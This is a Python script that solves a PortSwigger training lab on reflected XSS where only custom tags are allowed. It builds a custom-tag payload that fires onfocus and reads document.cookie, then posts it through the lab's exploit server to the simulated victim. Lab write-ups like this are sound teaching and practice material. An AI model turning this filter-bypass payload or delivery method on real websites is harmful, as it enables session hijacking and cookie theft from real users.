##############################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 22/11/2023
#
# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
#
# Steps: 1. Craft a script that will redirect the victim to the vulnerable website with 
#           the injected payload in the search query parameter
#        2. Deliver the exploit to the victim
#        3. The alert() function will be called after they trigger the exploit
#
##############################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a2000a004e4a56182a1705f005f001f.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0ad000370420a54782b26f4a01a3008c.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

# payload to call the alert function
payload = f"""<script>
                location = "{lab_url}/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
            </script>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The alert() function will be called after they trigger the exploit") 
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



